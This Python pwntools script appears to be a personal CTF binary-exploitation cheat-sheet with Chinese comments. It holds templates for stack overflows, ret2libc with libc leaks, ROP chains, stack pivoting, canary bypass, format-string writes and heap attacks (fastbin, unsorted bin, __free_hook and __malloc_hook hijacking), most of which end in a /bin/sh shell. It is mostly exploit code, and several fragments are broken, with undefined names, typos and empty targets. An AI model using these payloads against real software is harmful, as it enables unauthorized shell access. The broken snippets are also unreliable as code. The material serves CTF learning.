from pickle import OBJ
from re import L
from pwn import *
import sys
from LibcSearcher import *
from struct import pack

context(os='linux', arch='amd64', log_level='debug')

context.log_level='debug'
context.terminal=['gnome-terminal','-x', 'sh', '-c']#调试头

r = process('')
gdb.attach(proc.pidof(r)[0]) #调试跳出终端查看

def huibianchuancan():
    #x32:
    #    从 “右向左” 放入栈中

    #x64:
    #    参数小于7个时rdi, rsi, rdx, rcx, r8, r9
    #    参数大于等于7个时前六个一样，后面依次从 “右向左” 放入栈中，和32位汇编一样。

    #对于payload的特殊写法：
    #payload = flat({104:0x80491d0},word_size=32)
    #其中word_size相当于p32,104:0x80491d0 为在第105-108处写上0x80491d0（地址）
    return

def stackover():
    #覆盖都是覆盖一个非法的值，
    #若是一个合法值，则变为栈迁移

    #栈溢出
    #32是system后摸出返回后接bin/sh
    #64位是先让参数rdi(后有rsi,rdx,rcx,r8,r9)指向bin/sh，再执行system
    mpro_addr = elf.symbols['mprotect']
    read_addr = elf.symbols['read']
    write_addr = elf.symbols['write']
    #尽量使用它的地址

    #偏移地址尽量手算

    pop_ret = 0x7
    #返回函数看参数个数再进行匹配，ROPgadget --binary (elf) --only 'pop|ret'|grep pop
    
    #注意：汇编结尾没有leave
    # 起步刚开始就直接是rsp减去0x88，
    # 这里是没有把rbp压入栈，所以只需要0x88的数据大小，就可以覆盖返回地址了
    return

def rettext():

    # 覆盖函数返回地址，这时候就是直接看 EBP 即可。
    # 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。
    # 覆盖 bss 段某个变量的内容。
    # 根据现实执行情况，覆盖特定的变量或地址的内容。
    context(log_level='debug',arch='arm64',os='linux')
    a = remote()

    payload = b'string'+b'a'*8+p64(0x11111)#p64是发送64位的数字
    a.sendline(payload)
    a.recvuntil("")

    a.interactive()

    # from pwn import * x64下

    # r = remote('node4.buuoj.cn',29527)
    # sys_addr = 0x4004C0
    # bin_addr = 0x600A90
    # payload = b'a'*0x80+b'a'*4+p64(sys_addr)+b'a'*4+p64(bin_addr)
    # r.sendline(payload)

    # r.interactive()


    # from pwn import * x64下

    # r = remote('node4.buuoj.cn',29527)
    # sys_addr = 0x4004C0
    # bin_addr = 0x600A90
    # rdi_addr = 0x4006b3
    # payload = b'a'*0x80+b'a'*8+p64(rdi_addr)+p64(bin_addr)+p64ls(sys_addr)
    # r.sendline(payload)

    # r.interactive()
    return

def retshellcode32():
    #!/usr/bin/env python
    #有的是要先改bss处限权的 --栈迁移
    
    # mpro_addr = elf.symbols['mprotect']
    # read_addr = elf.symbols['read']
    # ret_addr = 0x0806fc08
    # buf_addr = 0x80EB000 

    # 函数mprotect
    #参数为：地址，大小，限权（1,2,4）
    # payload = b'a'*112

    # payload += p32(mpro_addr)+p32(ret_addr)
    # 这里释放时因为后面还会用到这些寄存器传参(rax,rbx,rcx)，所以将寄存器清空

    # payload += p32(buf_addr)+p32(0x1000)+p32(0x7)
    # payload += p32(read_addr)+p32(buf_addr)
    # payload += p32(0x0)+p32(buf_addr)+p32(0x100)#read的三个参数,使用上面的寄存器传

    #有时无法发送shellcode，则可以使用print(r.recvline())来把flag打印出来
    
    #xor ecx,ecx;
    #  2  xor edx,edx;
    #  3  push 0x0;        #字符串以\x00结尾 
    #  4  push 0x67616c66; #flag
    #  5  mov ebx,esp;
    #  6  mov eax,0x5; 
    #  7  int 0x80;
    #  8 #open
    #  9  mov ebx,0x3; 
    # 10  mov ecx, 0x0804A0A0; #直接写到shellcode下面的地址
    # 11  mov edx, 0x40;
    # 12  mov eax, 0x3;
    # 13  int 0x80;
    # 14 #read        
    # 15  mov ebx, 0x1;
    # 16  mov ecx, 0x0804A0A0;
    # 17  mov edx, 0x40;
    # 18  mov eax, 0x4;
    # 19  int 0x80;
    #    #write
    
    sh = process('./ret2shellcode')
    shellcode = asm(shellcraft.sh())
    buf2_addr = 0x804a080#此处buf2地址再bss，并且是可执行的

    sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
    sh.interactive()

def retsystemcall32():
    #x86上：
    #应用程序调用库函数（API）；
    # API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；
    # 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；
    # 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；
    # 中断处理函数返回到 API 中；
    # API 将 EAX 返回给应用程序。
    # 目的是为了执行execve("/bin/sh",NULL,NULL)
    #则首先ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'找到eax
    #!/usr/bin/env python
    pop_eax_ret = 0x080bb196
    pop_edx_ecx_ebx_ret = 0x0806eb90
    int_0x80 = 0x08049421
    binsh = 0x80be408
    payload = flat(
        ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
    sh.sendline(payload)
    sh.interactive()

def retlibc32_no_binsh():
    ##!/usr/bin/env python
    sh = process('')

    # 当程序调用system函数时，会自动去寻找栈底即ebp指向的位置，
    # 然后将ebp+8字节的位置的数据当作函数的参数，
    # 所以如果我们想将/bin/sh作为system函数的参数，
    # 就可以在栈溢出的时候，先修改eip为system函数的地址，
    # 然后填充4个字节的垃圾数据，再将/bin/sh的地址写入栈上，
    # 这样调用system函数的时候，就可以将/bin/sh作为参数，然后返回一个shell。

    #入栈时push eax 即将eax的值存到栈中
    #出栈时pop ebx  会将栈顶esp的值移到ebx

    gets_plt = 0x08048460
    system_plt = 0x08048490
    pop_ebx = 0x0804843d
    buf2 = 0x804a080
    payload = flat(
        [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])

    #or

    payload = p32(gets_plt)+p32(system_plt)+p32(buf2)+p32(buf2)
    #此时payload中gets后栈顶位buf2
    #再pop ebx使得函数可以实现实现递归或者嵌套的结构。
    #毕竟ebx，eax都只有一个
    sh.sendline(payload)
    sh.sendline('/bin/sh')
    sh.interactive()

def retlibc23_no_binish_more():
    #栈的开始：
    #        push ebp
    #        move ebp，esp

    #gdb调试时，参数就直接传递了，没有为什么，焯

    #32位下：
    #当需要多个函数时，可以有：
    main_addr = elf.symbols['vuln']
    flag_addr = elf.symbols['flag']
    win1_addr = 0x080485CB
    win2_addr = 0x080485D8
    ret_addr = 0x080483f6

    payload = b'a'*0x18+b'b'*0x4
    payload += p32(win1_addr)#无参数
    payload += p32(win2_addr)#有一个参数
    payload += p32(flag_addr)#有一个参数
    payload += p32(0xBAAAAAAD)+p32(0xDEADBAAD)
    #此时0xbaaaaaad对应第一个参数，0xdeadbaad对应第二个参数
    return

def retlibc32():
    #payload编写:
    #payload = b'a'(覆盖)+p32(函数地址)+p32(函数返回地址)+p32(函数参数1)+p32(函数参数2)......
    #payload = p32(函数2地址)+.....
    #64位则要先判断是否栈对齐，后先pop_rdi,在将参数传入rdi后再进行函数加函数返回地址

    #入LibcSearch模块
    r = remote('',)
    elf = ELF('./level3')
    puts_plt = elf.plt['put']
    #要利用的函数 这里利用wrihe
    puts_got = elf.got['put']
    #要泄露的函数的GOT地址，里面的内容即真实地址
    main_addr = elf.symbols['main']
    #返回地址为main，使其还可溢出
    payload = b'a'*140+p32(puts_plt)+p32(main_addr)+p32(puts_got)
    #payload = p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4) #后面p32(1)+p32(write_got)+p32(4)是write的三个参数
    #即p32(1)标准流  p32(write_got)偏移地址  p32(4)4个字节
    r.recv()
    r.sendline(payload)
    puts_addr = u32(r.recv()[:4].ljust(4,b'\x00'))
    #发送payload后会接收到write的真实地址
    libc = LibcSearcher('write',puts_addr)
    #利用LibcSearcher寻找libc版本
    base = puts_addr - libc.dump('write')
    #.dump为偏移地址
    sys_addr = base + libc.dump('system')
    sh_addr = base +libc.dump('str_bin_sh')
    payload2 = b'a'*140 +p32(sys_addr)+b'b'*4+p32(sh_addr)
    #or
    payload2 = b'a'*140 +p32(sys_addr)+p32(exit_addr)+p32(sh_addr)
    #or
    payload2 = b'a'*140 +p32(sys_addr)+p32(main_addr)+p32(sh_addr)
    r.recv()
    r.sendline(payload2)
    r.interactive()

def retlibc64():
    context.log_level='debug'
    #context.terminal=['']

    #入LibcSearch模块
    r = remote('node4.buuoj.cn',28135)
    elf = ELF('./ciscn_2019_c_1')

    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.sym['main']#main的真实地址

    pop_rdi_addr = 0x400c83
    ret_addr = 0x4006b9

    r.sendlineafter(b'Input your choice!\n',b'1')
    payload = b'\0'+b'a'*0x57+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    r.sendlineafter(b'Input your Plaintext to be encrypted\n',payload)

    r.recvline()#返回第一个该题第一个返回知道0x0a（\n）
    r.recvline()#返回第二个，具体依据题目而定
    #gdb.attach(proc.pidof(r)[0]) 调试跳出终端查看

    puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))#读取地址
    #or
    puts_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
    #读取地址时可能讲下一个接受的一起读取了
    #注意观察与调试

    print('puts_addr :',hex(puts_addr))

    libc = LibcSearcher('puts',puts_addr)#选择libc.so
    libcbase = puts_addr - libc.dump('puts')#计算基地址
    sys_addr = libcbase + libc.dump('system')#dump为偏移地址，及真实地址=基地址+偏移地址
    bin_addr = libcbase + libc.dump('str_bin_sh')
    #也可以上libc searcher 寻找，一般被确定的函数地址（puts）的后三位不变，根据后三位来
    # libcbase = puts_addr - 0x0809c0
    # sys_addr = libcbase + 0x04f440
    # bin_addr = libcbase + 0x1b3e9a  


    #！或者
    libc=ELF('./libc-2.23.so')
    libc_base=write_addr-0x00D43C0
    sys_addr=libc_base+libc.symbols['system']
    bin_addr=libc_base+next(libc.search(b'/bin/sh'))


    r.sendlineafter(b'Input your choice!\n',b'1')
    payload = b'\0'+b'a'*0x57+p64(ret_addr)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)#常规覆盖加命令调用运行
    #18版本的ubuntu需要ret来栈对齐
    r.sendlineafter('Input your Plaintext to be encrypted\n',payload)
    
    #如何看是否需要栈对齐：
    #ubuntu18以上版本64位程序system函数位于栈中的那个地址末尾需要是0，
    #如果是8则没对齐。
    #具体细节https://www.cnblogs.com/ZIKH26/articles/15996874.html

    r.interactive()#发送后可获得控制权

def retlibc64_more():
    r=remote("")
    elf=ELF('')
    libc=ELF('')

    #弱无单个地址含有参数相同的寄存器，则需要用到更多的寄存器，同时应注意参数数量一致
    rdi_ret=0x400733
    rsi_r15_ret=0x400731
    format_str=0x400770  #%s
    read_got=elf.got['']
    printf_plt=elf.plt['printf']
    main_addr=0x400636

    payload=b'a'*0x20+b'b'*0x8
    payload+=p64(rdi_ret)+p64(format_str)
    #printf有两个参数，由于无两以上个寄存器(含rdi)的，则先选择rdi，传入参数

    payload+=p64(rsi_r15_ret)+p64(read_got)+p64(0x0)
    #后再找到含rsi的寄存器所在地址，再传入相应个数的参数

    payload+=p64(printf_plt)+p64(main_addr)

    r.recvuntil("What's your name?")
    r.sendline(payload)
    #read_addr=u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
    read_addr=u64(r.recvuntil('\x7f')[-7:].ljust(8,b'\x00'))
    #接受数据，该数据一般以7f开头

    print("read_addr : ",hex(read_addr))
    libc_base=read_addr-libc.symbols['printf']
    system_addr=libc_base+libc.symbols['system']
    binsh_addr=libc_base+next(libc.search(b'/bin/sh'))

    payload2=b'a'*0x20+b'b'*0x8+p64(rdi_ret)+p64(binsh_addr)+p64(system_addr)+p64(main_addr)
    r.recvuntil("What's your name?")
    r.sendline(payload2)

    r.interactive()

def stackmove():
    #当栈的溢出空间不够时，则使用栈迁移
    #leave: mov ebp esp
    #       pop ebp

    #ret:  pop eip

    #执行栈迁移条件有二：
    # 1. 存在 leave ret 这类gadget指令
    # 2. 存在可执行shellcode的内存区域

    #对于条件一，使用ROPGadget可查看存在哪些gadget。
    # 程序中许多地方都存在一条 leave ret 指令，因此条件一满足。

    #对于条件二，system函数让「可执行」成为了可能，/bin/sh 则需要我们自行写入。

    #此时可以覆盖ebp和ret解决问题

    
    r = remote('')
    sys_addr = 0x08048490
    gets_addr=0x08048460
    leave_ret = 0x080484b8
    r.sendline(b'a'*24+b'b'*4)
    p.recvuntil(b"bbbb")
    #由于有printf的存在，可以使其先打印出栈的元素值，后读取ebp的位置和偏移量
    ebp_addr = u32(r.recv()[:4].ljust(4,b'\x00'))

    distance = 0x38#将ecx与ebp相差

    #此后可以开始覆盖ebp,先计算好'/bin/sh'在伪栈上的位置
    payload = b'aaaa' # for location, start of hijaction
    payload += p32(sys_addr)
    payload += b'dddd' # fake stack ebp
    payload += p32(ebp_addr - 0x28) # addr of binsh
    payload += b'/bin/sh\x00' # at ebp-0x28
    payload = payload.ljust(0x28, b'p') #0x28

    payload += p32(ebp_addr - 0x38) # hijack ebp ,-0x38 is the aaaa
    payload += p32(leave_ret) # new leave ret

    r.sendline(payload)
    r.interactive()
    return

def canary():
    # 1
    # 泄露canary地址
    # canary以00结尾
    # ctfwiki上为溢出一个便是覆盖00为'\n'，即0a
    # 此时该值减去0xa可得到该canary的值
    # 此后的发送发送一个和该canary一样的值即p32/64(canary)则可绕过canary保护

    io = process('./canary')
    get_shell = ELF("./canary").sym["getshell"]
    io.recvuntil("Hello Hacker!\n")
    # leak Canary
    payload = b"A"*100#该字符串数组长度
    io.sendline(payload)
    io.recvuntil("A"*100)
    Canary = u32(io.recv(4))-0xa#接受到该字符串数组的下一个数字，减去被覆盖的回车
    log.info("Canary:"+hex(Canary))
    # Bypass Canary
    payload = b"a"*100+p32(Canary)+b"a"*12+p32(get_shell)#此时再来覆盖
    io.send(payload)
    io.recv()
    io.interactive()


    #可根据ida分析
    return 

def stringformat1_bss():
    r = remote('')
    printf_addr = 0xfffff#printf地址
    ecx_addr = 0x55555#输入p32地址后的地址
    d_addr = ecx_addr - printf_addr#偏移地址
    p_addr = 0x13ac536#要被修改的参数的地址
    payload = p32(p_addr)+p32(p_addr+1)+p32(p_addr+2)+p32(p_addr+3)
    payload += b'%10$hhn%11$hhn%12$hhn%13$hhn'#假设d_addr = 10
    r.sendline(payload)
    p.sendline(str(0x10101010))
    r.interactive()
    #当scanf的字符串是'%d'时，用str(0xfc1)会输入修改成功。
    #当scanf的字符串是'%s'时，用p64(0xfc1)会输入修改成功。
    #用pwn脚本时，用str()发送数据是模拟交互输入，比如str(0xfc1)会发送过去 4033 这个字符串，
    # 就相当于我们与程序交互时，输入了4033这个数字，所以可以用"%d"来读取，并用小端序存储
    #用p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。本来是01这样表示的，
    # 但是ide为了方便观察， 就转换成了\xc1\x0f\x00\x00\x00\x00\x00\x00。发送时，也是按照字节来发，所以要用"%s"来读取
    return

def stringformat2_data():
    r = remote('')
    d_addr = 11#手算
    p_addr = 0x101010#需要改动的地址
    payload = p32(p_addr)+b'%11$n'
    r.sendline(payload)

    #例：
    #输入aaaa %08p %08p %08p %08p %08p %08p %08p %08p %08p %08p %08p %08p %08p %08p %08p
    #得到：0xfff5acfc 0x000050 0xf7f1b000 0xf7ee2540 0xffffffff 0x8048034 0xfff5ae14 0xf7f1b608 0x000020 0x000050 0x61616161
    #在第11个位置位位0x61616161即aaaa，可得到偏移位置为11
    #d_addr = 11

    return

def integetoverflow():
    #如果时(int)buf>32
    r = remote('')
    r.sendline(b'2147483649')#2147483649在int中是-1

    #此时造成整数溢出
    r = remote('')
    r.sendline(b'-1')#根据实际情况而定

def heapover():
    #利用思路：
    # 1. 在子线程中找到堆空间的地址
    # 2. 在该地址中恢复线程的arena的机构
    # 3. 通过arena的结构尝试堆利用

    # 我们利用堆溢出的策略是

    # 覆盖与其物理相邻的下一个 chunk 的元数据。
    # 利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，
    # 从而来控制程序的执行流。


    return

def off_by_one():
    # 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，
    # 从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法
    # 溢出字节为 NULL 字节：在 size 为 0x100 的时候，
    # 溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。
    # （1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。
    # （2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，
    #       从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。

    #填充长度 = 要覆盖的地址 - 开始写入的地址
    def function():
        return
      

def fastbin_attack():
    #1.读取libc的基地址,从而获得malloc的地址,再进行劫持malloc__hook
    # babyheap：
    allo(0x80)#id = 0           四个0x10、一个0x80
    allo(0x80)#id = 1           第0个块作用：方便修改第1、2块
    allo(0x80)#id = 2           第3个块作用：方便修改0x80的块
    allo(0x80)#id = 3

    #gdb.attach(proc.pidof(r)[0])

    #duoble free
    free(1)
    payload = b'a'*0x88+p64(0x121)
    fill(0,len(payload),payload)
    allo(0x110)
    payload = b'a'*0x88+p64(0x91)
    fill(1,len(payload),payload)
    free(2)
    dump(1)

    malloc_hook = u64(r.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-88-0x10
    libc_base = malloc_hook - libc.symbols['__malloc_hook']
    log.success('libc_base is {}'.format(hex(libc_base)))
    
    #2.
  
 
def unsortedbin_attack():
    #1.通过free后的chunk的fd与bk，chunk->bk = ptr-0x10 伪造heap, 此题为easyheap
    create(0x68,'aaaa') # chunk 0
    create(0x68,'bbbb') # chunk 1
    create(0x68,'cccc') # chunk 2
    delete(2) # 释放 heap2 让其进入 fastbin

    #gdb.attach(proc.pidof(r)[0])
    payload = b'/bin/sh\x00' + b'a' * 0x60 + p64(0x71) + p64(0x6020b0-3)
    edit(1,len(payload),payload)
    # 修改 heap1 内容为 '/bin/sh\x00', 以及堆溢出 heap2(freed) 修改其 fd 指针 
    # 因为最后释放的是 heap1,利用 '__free_hook'(system) Getshell 
    # 为什么是 0x6020b0 - 3? 这是调试出来的
    # FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f
    # 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)
    # 这样就伪造出了一个 chunk

    create(0x68,'aaaa') # chunk 2 (从 fastbin 里取出的)

    create(0x68,'c') # chunk 3 / idx = 0 (Fake)
  
def __free_hook_attack():
    #由于free函数会指向一个指针，再通过这个指针释放
    #则可以使用一个目的地址代替此指针
    #即可使free函数指向指定的函数
    
    
    
    #1. easyheap的freehook劫持：
    payload = b'\xaa' * 3 + p64(0) * 4 + p64(free_got)
    edit(3,len(payload),payload)
    # 修改 heap3 (Fake)
    # 作用是把 heaparray[0] 的地址 (原先记录的是 chunk 3 的地址) 覆写成 free_got 地址
    # 这就是要在 heaparry 附近构造 Fakeheap 的原因
    # 确定具体的偏移量需要动态调试 


    payload = p64(elf.plt['system'])
    edit(0,len(payload),payload)
    # free_got 地址的作用在这里体现了
    # 由于 edit() 的目标是 heaparry[] 里面的地址
    # 那么本次操作将修改 free_got 为 system_plt 的地址

    delete(1)
    # 当释放 chunk1 (内容为 '/bin/sh\0x00') 的时候
    # 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()
    # 最后程序执行的就是 system(chunk1's content) 即 system('/bin/sh\0x00'), 成功 Getshell
    
    
    #2. b00ks的freehook劫持：
    payload = p64(free_hook)
    edit(1,payload)

    payload = p64(sys_addr)

    # gdb.attach(proc.pidof(r)[0])
    edit(2,payload) #劫持__free_hook以system代替

    #pause()
    payload = p64(bin_addr)
    #pause()
    #edit(1,'/bin/sh')
    create(0x20,'/bin/sh',0x20,'/bin/sh')

    delete(3)

    #gdb.attach(proc.pidof(r)[0])
    r.interactive()
  
def __malloc_hook_attack():
    #有时候会劫持不到free，则换成劫持malloc
    allo(0x80) #2
    allo(0x60) #4
    allo(0x60) #5

    free(5)
    payload = b'a'*0x68+p64(0x71)+p64(malloc_hook - 0x23)
    fill(4,len(payload),payload)
    allo(0x60) #5
    allo(0x60) #6

    one_gadget = libc_base + 0x4526a
    payload = b'a'*0x13+p64(one_gadget)
    fill(6,len(payload),payload)

    allo(0x10)#此时为将malloc劫持为了system
  
